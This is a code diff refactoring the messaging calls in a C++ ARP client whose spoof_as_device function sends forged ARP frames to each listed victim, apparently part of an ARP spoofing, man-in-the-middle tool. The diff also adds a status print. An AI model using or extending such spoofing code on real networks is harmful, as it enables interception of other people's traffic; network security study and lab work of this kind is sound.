@@ -71,13 +71,15 @@ mac_addr arp_conn_client::search_for_device(std::string priv_ip) {
 
     // send request
     ether_client->change_dest_mac(BROADCAST_MAC);
-    ether_client->send_next_prot_msg(htons(ETH_P_ARP), buff, sizeof(ether_arp));
+    ether_client->setNextProt(htons(ETH_P_ARP));
+    ether_client->send_next_msg(buff, sizeof(ether_arp));
 
     // receive reply
 #define BUFF_LEN 512
     char reply[BUFF_LEN];
     memset(reply, 0, BUFF_LEN);
-    ether_client->recv_prot_next_msg(htons(ETH_P_ARP), reply, BUFF_LEN);
+    ether_client->setNextProt(htons(ETH_P_ARP));
+    ether_client->recv_next_msg(reply, BUFF_LEN);
 
     struct ether_arp *arp_reply = (struct ether_arp *) reply;
     if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY) {
@@ -125,7 +127,8 @@ void arp_conn_client::spoof_as_device(std::string device,
             memset(arp_header->arp_tpa, 0x00, IP4LEN);
 
             ether_client->change_dest_mac(BROADCAST_MAC);
-            ether_client->send_next_prot_msg(htons(ETH_P_ARP), buff, sizeof(ether_arp));
+            ether_client->setNextProt(htons(ETH_P_ARP));
+            ether_client->send_next_msg(buff, sizeof(ether_arp));
 
         } else { // spoof every victim
             for (pair<mac_addr, string> &victim: victim_devices) {
@@ -139,10 +142,13 @@ void arp_conn_client::spoof_as_device(std::string device,
                 memcpy(arp_header->arp_tpa, &victim_ip, sizeof(arp_header->arp_tpa));
 
                 ether_client->change_dest_mac(victim_mac);
-                ether_client->send_next_prot_msg(htons(ETH_P_ARP), buff, sizeof(ether_arp));
+                ether_client->setNextProt(htons(ETH_P_ARP));
+                ether_client->send_next_msg(buff, sizeof(ether_arp));
             }
 
         }
+
+        cout << "spoofed frames sent" << endl;
     }
 
 }
